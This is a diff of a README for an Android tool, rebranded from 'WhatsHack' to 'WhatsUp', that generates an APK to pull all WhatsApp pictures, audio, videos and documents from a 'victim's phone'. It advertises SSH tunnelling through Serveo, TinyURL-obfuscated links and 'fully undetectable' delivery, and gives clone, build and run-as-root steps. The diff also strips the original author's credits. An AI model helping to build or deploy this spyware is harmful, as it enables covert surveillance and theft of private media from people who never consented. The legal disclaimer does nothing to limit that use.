@@ -1,22 +1,19 @@
-# WhatsHack v1.1
-## Author: https://github.com/thelinuxchoice/whatshack
-## IG: https://www.instagram.com/linux_choice
-### Don't copy this code without give me the credits, nerd! 
+# WhatsUp v1.1
+A toool to generate an android apk to get access to all WhatsApp media (pictures, audios, videos, documents) from victim's phone.
 
-Script to generate Android App to Hack All WhatsApp Media Files.
+## Instagram: https://instagram.com/programemerz
 
-![whats1](https://user-images.githubusercontent.com/34893261/44965650-0948c600-af0d-11e8-9ae3-3c771eade60b.png)
-![whats2](https://user-images.githubusercontent.com/34893261/44965651-09e15c80-af0d-11e8-95fa-3d53a92352b8.png)
+![](image.jpg)
 
 
 ### Features:
 #### Port Forwarding using SSH Tunneling with Serveo.net
 #### Obfuscated URL by Tinyurl
-#### Fully Undetectable
+#### FUD (F)ully Undetectable
 
 ## Legal disclaimer:
 
-Usage of WhatsHack for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program 
+Usage of WhatsUp for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program 
 
 
 ### Installing on Kali Linux:
@@ -51,9 +48,9 @@ Go to SDK Manager (Configure -> SDK Manager) and Download:
 Android SDK Build-tools, Android SDK-tools, Android SDK platform-tools, Support Repository
 
 Run script:
-# git clone https://github.com/thelinuxchoice/whatshack
-# cd whatshack/
-# bash whatshack.sh
+# git clone https://github.com/programemerz/whatsup
+# cd whatsup/
+# bash whatsup.sh
 
 
 On First Time, Choose "n" when asks to build, then open the project on Android Studio:
@@ -61,7 +58,7 @@ cd /opt/android-studio/bin
 ./studio.sh
 
 Import Gradle Project:
-Choose whatshack app folder: whatshack/app/
+Choose whatsup app folder: whatsup/app/
 
 Wait all dependencies downloading, if you got errors, click on showed links to solve.
 Try build from Android Studio: Build > build APK's
@@ -75,9 +72,5 @@ change gradle version from: 3.4.1 to: 2.2.0
 save and exit.
 
 Run script (as root):
-# bash whatshack.sh
+# bash whatsup.sh
 ```
-### Donate!
-Support the authors:
-
-<noscript><a href="https://liberapay.com/thelinuxchoice/donate"><img alt="Donate using Liberapay" src="https://liberapay.com/assets/widgets/donate.svg"></a></noscript>
